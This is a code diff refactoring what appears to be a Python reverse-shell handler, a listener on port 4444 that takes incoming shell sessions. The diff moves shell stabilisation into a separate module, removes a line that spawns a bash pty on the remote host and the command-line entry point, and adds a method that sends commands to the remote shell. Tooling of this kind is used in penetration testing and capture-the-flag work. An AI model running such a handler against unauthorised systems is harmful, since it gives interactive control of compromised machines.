@@ -6,11 +6,8 @@ import os
 import select
 import termios
 import tty
-import argparse
-
-GREEN = "\033[92m"
-RESET = "\033[0m"
-RED = "\033[91m"
+from src.stabalize import stable
+from src.colours import GREEN, RESET, RED
 
 class Sock:
     def __init__(self, sock, address):
@@ -61,7 +58,10 @@ class Shell:
         self.sock = Sock(session, host)
     
     def terminal(self):
-        self.sock.send("python3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n")
+        SHELL = stable(self)
+        SHELL.inspect()
+        SHELL.upgrade()
+
 
         old_settings = termios.tcgetattr(sys.stdin)
 
@@ -90,6 +90,7 @@ class Shell:
 
                         # Ctrl-]
                         if b"\x1d" in data:
+                            self.command("exit\n")
                             break
 
                         if data:
@@ -113,27 +114,9 @@ class Shell:
 
             print(f"\n{GREEN}[*] Connection closed{RESET}")
 
-if __name__ == "__main__":
-    parser = argparse.ArgumentParser(
-        description="RevShell Handler"
-    )
-    parser.add_argument(
-        "-l",
-        "--listen",
-        default="0.0.0.0",
-        help="Listen address"
-    )
+    def command(self, cmd):
+        if cmd:
+            self.sock.send(cmd + "\n")
+            return self.sock.recv()
+        
 
-    parser.add_argument(
-        "-p",
-        "--port",
-        type=int,
-        default=4444,
-        help="Listen port"
-    )
-
-    args = parser.parse_args()
-
-    handler = Shell(args.listen, args.port)
-    handler.listen()
-    handler.terminal()
